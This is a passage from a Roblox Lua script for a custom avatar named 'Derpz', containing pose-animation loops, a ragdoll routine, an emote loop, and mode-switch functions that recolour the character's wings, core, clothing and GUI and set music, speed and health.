Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.2,0.6)*angles(math.rad(-40.1),math.rad(6.6),math.rad(1.1))*necko,Alpha)
end
soundeffect(157869722,0.95,tors,4,0,"zip")
for i = 0, 2, 0.1 do
swait()
local Alpha = .2
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0.3),math.rad(-10.7),math.rad(2.2))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.9,0)*angles(math.rad(2.9),math.rad(19.2),math.rad(-3.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(0),math.rad(-10.3),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.1,-0.3)*angles(math.rad(67.4),math.rad(-12.5),math.rad(76.6)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,0)*angles(math.rad(0),math.rad(0),math.rad(2)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.2,0.6)*angles(math.rad(-37.8),math.rad(6.6),math.rad(0.9))*necko,Alpha)
end
DerpzMorphTrans(1)
DerpzMorph2Trans(0)
for i = 0, 4, 0.1 do
swait()
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0),math.rad(-3.8),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(2.9),math.rad(19.2),math.rad(-0.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(0),math.rad(-10.3),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.1,-0.3)*angles(math.rad(74.6),math.rad(17.8),math.rad(76.3)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,0)*angles(math.rad(0),math.rad(0),math.rad(4.3)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.2,0.5)*angles(math.rad(-32.6),math.rad(6.6),math.rad(0.3))*necko,Alpha)
end
for i = 0, 10, 0.1 do
swait()
local Alpha = .05
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0.6),math.rad(-19.4),math.rad(-0.2))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(2.9),math.rad(19.2),math.rad(-3.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.9,0)*angles(math.rad(0),math.rad(-10.3),math.rad(3.3))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.3,0)*angles(math.rad(0),math.rad(0),math.rad(-7.2)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,0)*angles(math.rad(0),math.rad(0),math.rad(3.5)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0.1,0,0.1)*angles(math.rad(-5.7),math.rad(18.3),math.rad(3.2))*necko,Alpha)
end
end
attack = false
hum.WalkSpeed = storehumanoidWS
else
chatfunc("I'm not Derpz...",25,BrickColor.new("Really red").Color)
end
end

function freefalldeathragdoll()
attack = true
--ragdoll function from one of my old scripts
hum.Name = "Humanoid"
hum.Health = 0.005
Player.Character.Humanoid.PlatformStand = true
lshclone = Player.Character.Torso["Left Shoulder"]:Clone()
rshclone = Player.Character.Torso["Right Shoulder"]:Clone()
lhclone = Player.Character.Torso["Left Hip"]:Clone()
rhclone = Player.Character.Torso["Right Hip"]:Clone()
local leftarm = Player.Character["Left Arm"]
local rightrm = Player.Character["Right Arm"]
local leftleg = Player.Character["Left Leg"]
local rightleg = Player.Character["Right Leg"]
Player.Character.Torso["Left Hip"]:destroy()
local head = Player.Character.Head
glue = Instance.new("Glue", Player.Character.Torso)
glue.Part0 = Player.Character.Torso
glue.Part1 = leftleg
glue.Name = "Left leg"
collider = Instance.new("Part", leftleg)
collider.Position = Vector3.new(0,999,0)
collider.Size = Vector3.new(1.5, 1, 1)
collider.Shape = "Cylinder"
local weld = Instance.new("Weld", collider)
weld.Part0 = leftleg
weld.Part1 = collider
weld.C0 = CFrame.new(0,-0.2,0) * CFrame.fromEulerAnglesXYZ(0, 0, math.pi/2)
collider.TopSurface = "Smooth"
collider.BottomSurface = "Smooth"
collider.formFactor = "Symmetric"
glue.C0 = CFrame.new(-0.5, -1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
glue.C1 = CFrame.new(-0, 1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
collider.Transparency = 1
------------
Player.Character.Torso["Right Hip"]:destroy()
glue1 = Instance.new("Glue", Player.Character.Torso)
glue1.Part0 = Player.Character.Torso
glue1.Part1 = rightleg
glue1.Name = "Right leg"
collider1 = Instance.new("Part", rightleg)
collider1.Position = Vector3.new(0,9999,0)
collider1.Size = Vector3.new(1.5, 1, 1)
collider1.Shape = "Cylinder"
local weld1 = Instance.new("Weld", collider1)
weld1.Part0 = rightleg
weld1.Part1 = collider1
weld1.C0 = CFrame.new(0,-0.2,0) * CFrame.fromEulerAnglesXYZ(0, 0, math.pi/2)
collider1.TopSurface = "Smooth"
collider1.BottomSurface = "Smooth"
collider1.formFactor = "Symmetric"
glue1.C0 = CFrame.new(0.5, -1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
glue1.C1 = CFrame.new(0, 1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
collider1.Transparency = 1
------------
Player.Character.Torso["Right Shoulder"]:destroy()
glue11 = Instance.new("Glue", Player.Character.Torso)
glue11.Part0 = Player.Character.Torso
glue11.Part1 = rightrm
glue11.Name = "Right shoulder"
collider11 = Instance.new("Part", rightrm)
collider11.Position = Vector3.new(0,9999,0)
collider11.Size = Vector3.new(1.8,1,1)
collider11.Shape = "Cylinder"
local weld11 = Instance.new("Weld", collider11)
weld11.Part0 = rightrm
weld11.Part1 = collider11
weld11.C0 = CFrame.new(0,-0.2,0) * CFrame.fromEulerAnglesXYZ(0, 0, math.pi/2)
collider11.TopSurface = "Smooth"
collider11.BottomSurface = "Smooth"
collider11.formFactor = "Symmetric"
glue11.C0 = CFrame.new(1.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
glue11.C1 = CFrame.new(0, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
collider11.Transparency = 1
------------
Player.Character.Torso["Left Shoulder"]:destroy()
glue111 = Instance.new("Glue", Player.Character.Torso)
glue111.Part0 = Player.Character.Torso
glue111.Part1 = leftarm
glue111.Name = "Left shoulder"
collider111 = Instance.new("Part", leftarm)
collider111.Position = Vector3.new(0,9999,0)
collider111.Size = Vector3.new(1.5, 1, 1)
collider111.Shape = "Cylinder"
local weld111 = Instance.new("Weld", collider111)
weld111.Part0 = leftarm
weld111.Part1 = collider111
weld111.C0 = CFrame.new(0,-0.2,0) * CFrame.fromEulerAnglesXYZ(0, 0, math.pi/2)
collider111.TopSurface = "Smooth"
collider111.BottomSurface = "Smooth"
collider111.formFactor = "Symmetric"
glue111.C0 = CFrame.new(-1.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
glue111.C1 = CFrame.new(0, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
collider111.Transparency = 1
end

smuggyval = false
function smuggy()
attack = true

hum.WalkSpeed = 0
repeat
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.Out
local animatetime = .25
 Animate(RootJoint,cf(0,-0.1,0)*angles(math.rad(0),math.rad(-11),math.rad(-8))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1.1,0)*angles(math.rad(0),math.rad(15),math.rad(-6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.7,-0.3)*angles(math.rad(2.9),math.rad(-6.7),math.rad(18.2))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1,0.4,-0.6)*angles(math.rad(81.2),math.rad(-27.6),math.rad(60)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,0.3)*angles(math.rad(63.4),math.rad(-24.1),math.rad(55.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-0),math.rad(7),math.rad(8)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .25
 Animate(RootJoint,cf(-0.1,0.1,0)*angles(math.rad(0),math.rad(5),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1.2,-0.2)*angles(math.rad(0),math.rad(15),math.rad(-6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,-0.2)*angles(math.rad(0),math.rad(0),math.rad(18))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.7,-0.3)*angles(math.rad(116),math.rad(-7.4),math.rad(-0.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.7,-0.4)*angles(math.rad(115.5),math.rad(-3.2),math.rad(-3.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-6.5),math.rad(1.2),math.rad(-10)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.Out
local animatetime = .25
 Animate(RootJoint,cf(0,-0.2,0)*angles(math.rad(0),math.rad(5),math.rad(14))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-0.5,-0.3)*angles(math.rad(3.1),math.rad(20.2),math.rad(-24.8))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.1,-0.2)*angles(math.rad(-3.5),math.rad(-10.2),math.rad(-5.6))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.7,0.2,-0.1)*angles(math.rad(100),math.rad(23.8),math.rad(-46.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1,0.5,-0.7)*angles(math.rad(95.2),math.rad(23.5),math.rad(-47.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(5.8),math.rad(-16.1),math.rad(-3.4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .2
 Animate(RootJoint,cf(-0.1,0.1,0)*angles(math.rad(0),math.rad(5),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1.2,-0.2)*angles(math.rad(0),math.rad(15),math.rad(-6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,-0.2)*angles(math.rad(0),math.rad(0),math.rad(18))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.8,-0.6)*angles(math.rad(116),math.rad(-7.4),math.rad(-0.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.7,-0.5)*angles(math.rad(115.5),math.rad(-3.2),math.rad(-3.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.7),math.rad(0.3),math.rad(-9.7)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
until smuggyval == false
attack = false
hum.WalkSpeed = storehumanoidWS
end

WingStyle = script.WingStyle.Value
script.WingStyle.Changed:Connect(function()
WingStyle = script.WingStyle.Value
-- script.thingy.lol:FireAllClients(WingStyle)
end)
function ModeSwitchLoop(data) --This function is for looping anything which needs to be looped. There's no tweening, And no audio changes.

--[[

ModeSwitchLoop({

Name = "Test",
desc = "Test Description",
modestring = "TestMode",
wcol1 = Color3.new(0,0,1),
wcol2 = Color3.new(0,0,0),
wcorecol1 = Color3.new(0,0,0),
wcorecol2 = Color3.new(0,1,0),
eyecol1 = Color3.new(0,0,0),
eyecol2 = Color3.new(0,0,0),
wtr1 = 0,
wtr2 = 0.5,
wstyle = "Classic",
txtg1 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
txtg2 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
txtg3 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})





]]


if TheGameChangerValue then
text.Text = data.Name.." "..MorphedInto
else
text.Text = data.Name
end
GauntGui.Frame.TextLabel.Text = data.Name
GauntGui.Frame.TextLabel.UIGradient.Color = ColorSequence.new(data.wcol1,data.wcol2)
for i = 1,#visualae do
local right = visualae[i]
right.BackgroundColor3 = data.wcol1

end
desctext.Text = data.desc
text.Font = data.font
desctext.Font = data.font
NameOfMode.Text = "Mode name: "..data.Name
NameOfMode.Font = data.font
NameOfMode.UIGradient.Color = data.txtg1
--SongNameTxt.Text = "Music: "..data.musicname
SongNameTxt.Font = data.font
SongNameTxt.UIGradient.Color = data.txtg2
OtherVisFrame.ImageCol1_1.ImageColor3 = data.wcol1
OtherVisFrame.ImageCol1_2.ImageColor3 = data.wcol1
OtherVisFrame.ImageCol1_2.ImageColGlow.ImageColor3 = data.wcol1
OtherVisFrame.ImageCol2_1.ImageColor3 = data.wcol2
OtherVisFrame.ImageCol2_2.ImageColor3 = data.wcol2
MAINRUINCOLOR = data.wcol1
ModeOfCharacter = data.modestring
textgr.Color = data.txtg1 
desctextgr.Color = data.txtg2 
linegr.Color = data.txtg3 
img1.ImageColor3 = data.wcol1
img2.ImageColor3 = data.wcol2
img3.ImageColor3 = data.wcol1
EyesFolder.LeftEye.Color = data.eyecol1
EyesFolder.RightEye.Color = data.eyecol2
script.WingStyle.Value = data.wstyle
if data.Unleashed == true then
EffGoBrr.Enabled = true
EffGoBrr.Color = data.txtg1
else
EffGoBrr.Enabled = false
end
--if data.ExtraOptions == true then
--if data.HealthCap ~= nil then
--hum.Health = data.HealthCap
--hum.MaxHealth = data.HealthCap
--else
--end
--else

--end
--Above is removed for purposes of not becoming a pure god.



--Clothing
if hoodval == false then
for i,v in pairs(DerpzMorph2TORS:GetChildren()) do
if v.Name == "D" or v.Name == "e" or v.Name == "r" or v.Name == "p" or v.Name == "z" then
v.Color = data.wcol1
elseif v.Name == "Core" then
v.Color = data.wcol2
end
end
elseif hoodval == true then
for i,v in pairs(DerpzMorphTORS:GetChildren()) do
if v.Name == "D" or v.Name == "e" or v.Name == "r" or v.Name == "p" or v.Name == "z" then
v.Color = data.wcol1
elseif v.Name == "Core" then
v.Color = data.wcol2
end
end
end
--Clothing


--Wings and Core
--local transitionInfo = TweenInfo.new(0.01,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut)
for i,v in pairs(wing1:GetChildren()) do
if v.Name == "ColorInside" then
v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end


elseif v.Name == "ColorOutside" then
v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end

elseif v.Name == "Core" then
v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end

end
end
for i,v in pairs(wing2:GetChildren()) do
if v.Name == "ColorInside" then
v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end


elseif v.Name == "ColorOutside" then
v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end

elseif v.Name == "Core" then
v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end

end
end
for i,v in pairs(wing3:GetChildren()) do
if v.Name == "ColorInside" then
v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end


elseif v.Name == "ColorOutside" then
v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end

elseif v.Name == "Core" then
v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end

end
end
for i,v in pairs(wing4:GetChildren()) do
if v.Name == "ColorInside" then
v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end


elseif v.Name == "ColorOutside" then
v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end

elseif v.Name == "Core" then
v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end

end
end
for i,v in pairs(wing5:GetChildren()) do
if v.Name == "ColorInside" then
v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end


elseif v.Name == "ColorOutside" then
v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end

elseif v.Name == "Core" then
v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end

end
end
for i,v in pairs(wing6:GetChildren()) do
if v.Name == "ColorInside" then
v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end


elseif v.Name == "ColorOutside" then
v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end

elseif v.Name == "Core" then
v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end

end
end
for i,v in pairs(core:GetChildren()) do
if v.Name == "Color1b" or v.Name == "Color3b" then
v.Color = data.wcorecol1
--local tween = game:GetService("TweenService"):Create(v, transitionInfo, {Color = data.wcorecol1}) tween:Play()
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
elseif v.Name == "Color2b" then
v.Color = data.wcorecol2
v.Transparency = data.wtr2
--local tween = game:GetService("TweenService"):Create(v, transitionInfo, {Color = data.wcorecol1}) tween:Play()
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end
elseif v.Name == "D" then
v.Color = data.wcorecol2
v.Transparency = data.wtr2
v.Attachment.ParticleEmitter.Color = ColorSequence.new(data.wcorecol1,data.wcorecol2)
if data.CoreMat == nil then
else
v.Material = data.CoreMat
end
--local tween = game:GetService("TweenService"):Create(v, transitionInfo, {Color = data.wcorecol2}) tween:Play()
end
end








end






local CanLoop = true
EffGoBrr = script.Effects.EffectGoBrrr
EffGoBrr.Parent = tors
function ModeSwitch(data)

--[[

ModeSwitch({

Name = "Test",
desc = "Test Description",
modestring = "TestMode",
wcol1 = Color3.new(0,0,1),
wcol2 = Color3.new(0,0,0),
wcorecol1 = Color3.new(0,0,0),
wcorecol2 = Color3.new(0,1,0),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0,
wtr2 = 0.5,
wstyle = "Classic",
txtg1 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
txtg2 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
txtg3 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
musicid = 5894657127,
musicname = "DerpzDeNugget - Expern Dreams",
musicpit = 1,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Happy(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})





]]

CanLoop = false

if data.Unleashed == true then
--Do unleashed intro
--ModeChangeEnable(true,data.wcol1,data.wcol2)
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .25
Animate(RootJoint,cf(0,0,0)*angles(math.rad(17.4),math.rad(-13.9),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1.2,-0.2)*angles(math.rad(-15.5),math.rad(12.4),math.rad(2.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.1,-0.6)*angles(math.rad(-29.7),math.rad(0),math.rad(13.2))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.1,1.2,-0.5)*angles(math.rad(152.9),math.rad(18),math.rad(27.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1,1.3,-0.5)*angles(math.rad(156.5),math.rad(-18.6),math.rad(-49.1)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-14),math.rad(-1.5),math.rad(17.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
else
--Don't do unleashed intro
end





if TheGameChangerValue then
text.Text = data.Name.." "..MorphedInto
else
text.Text = data.Name
end
GauntGui.Frame.TextLabel.Text = data.Name
GauntGui.Frame.TextLabel.UIGradient.Color = ColorSequence.new(data.wcol1,data.wcol2)
for i = 1,#visualae do
local right = visualae[i]
right.BackgroundColor3 = data.wcol1

end
desctext.Text = data.desc
text.Font = data.font
desctext.Font = data.font
NameOfMode.Text = "Mode name: "..data.Name
NameOfMode.Font = data.font
NameOfMode.UIGradient.Color = data.txtg1
--SongNameTxt.Text = "Music: "..data.musicname
SongNameTxt.Font = data.font
SongNameTxt.UIGradient.Color = data.txtg2
OtherVisFrame.ImageCol1_1.ImageColor3 = data.wcol1
OtherVisFrame.ImageCol1_2.ImageColor3 = data.wcol1
OtherVisFrame.ImageCol1_2.ImageColGlow.ImageColor3 = data.wcol1
OtherVisFrame.ImageCol2_1.ImageColor3 = data.wcol2
OtherVisFrame.ImageCol2_2.ImageColor3 = data.wcol2
MAINRUINCOLOR = data.wcol1
ModeOfCharacter = data.modestring
textgr.Color = data.txtg1 
desctextgr.Color = data.txtg2 
linegr.Color = data.txtg3 
img1.ImageColor3 = data.wcol1
img2.ImageColor3 = data.wcol2
img3.ImageColor3 = data.wcol1
script.WingStyle.Value = data.wstyle
DerpzMusic.SoundId = "rbxassetid://"..data.musicid 
DerpzMusic.Pitch = data.musicpit
songnameboi = data.musicname
local lolemotion = data.emotion
EyesFolder.LeftEye.Color = data.eyecol1
EyesFolder.RightEye.Color = data.eyecol2
storehumanoidWS = data.ws
hum.WalkSpeed = data.ws
hum.JumpPower = data.jp
if muted == false then
DerpzMusic.Volume = data.musicvol 
elseif muted == true then
DerpzMusic.Volume = 0

end
if data.musicpos ~= nil and data.musicpos ~= "DontChange" then
DerpzMusic.TimePosition = data.musicpos
end
if data.Unleashed == true then
EffGoBrr.Enabled = true
EffGoBrr.Color = data.txtg1
else
EffGoBrr.Enabled = false
end

if data.ExtraOptions == true then
if data.HealthCap ~= nil then
hum.Health = data.HealthCap
hum.MaxHealth = data.HealthCap
else
end
else

end

--Clothing
if hoodval == false then
for i,v in pairs(DerpzMorph2TORS:GetChildren()) do
if v.Name == "D" or v.Name == "e" or v.Name == "r" or v.Name == "p" or v.Name == "z" then
v.Color = data.wcol1
elseif v.Name == "Core" then
v.Color = data.wcol2
end
end
elseif hoodval == true then
for i,v in pairs(DerpzMorphTORS:GetChildren()) do
if v.Name == "D" or v.Name == "e" or v.Name == "r" or v.Name == "p" or v.Name == "z" then
v.Color = data.wcol1
elseif v.Name == "Core" then
v.Color = data.wcol2
end
end
end
--Clothing


--Wings and Core
local transitionInfo = TweenInfo.new(.2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut)
for i,v in pairs(wing1:GetChildren()) do
if v.Name == "ColorInside" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
elseif v.Name == "ColorOutside" then
--v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol2}) tween:Play()
elseif v.Name == "Core" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
end
end
for i,v in pairs(wing2:GetChildren()) do
if v.Name == "ColorInside" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
elseif v.Name == "ColorOutside" then
--v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol2}) tween:Play()
elseif v.Name == "Core" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
end
end
for i,v in pairs(wing3:GetChildren()) do
if v.Name == "ColorInside" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
elseif v.Name == "ColorOutside" then
--v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol2}) tween:Play()
elseif v.Name == "Core" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
end
end
for i,v in pairs(wing4:GetChildren()) do
if v.Name == "ColorInside" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
elseif v.Name == "ColorOutside" then
--v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol2}) tween:Play()
elseif v.Name == "Core" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
end
end
for i,v in pairs(wing5:GetChildren()) do
if v.Name == "ColorInside" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
elseif v.Name == "ColorOutside" then
--v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol2}) tween:Play()
elseif v.Name == "Core" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
end
end
for i,v in pairs(wing6:GetChildren()) do
if v.Name == "ColorInside" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
elseif v.Name == "ColorOutside" then
--v.Color = data.wcol2
v.Transparency = data.wtr2
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol2}) tween:Play()
elseif v.Name == "Core" then
--v.Color = data.wcol1
v.Transparency = data.wtr1
v.PointLight.Color = data.wcol1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcol1}) tween:Play()
end
end
for i,v in pairs(core:GetChildren()) do
if v.Name == "Color1b" or v.Name == "Color3b" then
--v.Color = data.wcorecol1
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcorecol1}) tween:Play()
v.Transparency = data.wtr1
if data.WingMat1 == nil then
else
v.Material = data.WingMat1
end
elseif v.Name == "Color2b" then
--v.Color = data.wcorecol2
v.Transparency = data.wtr2
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcorecol1}) tween:Play()
if data.WingMat2 == nil then
else
v.Material = data.WingMat2
end
elseif v.Name == "D" then
--v.Color = data.wcorecol2
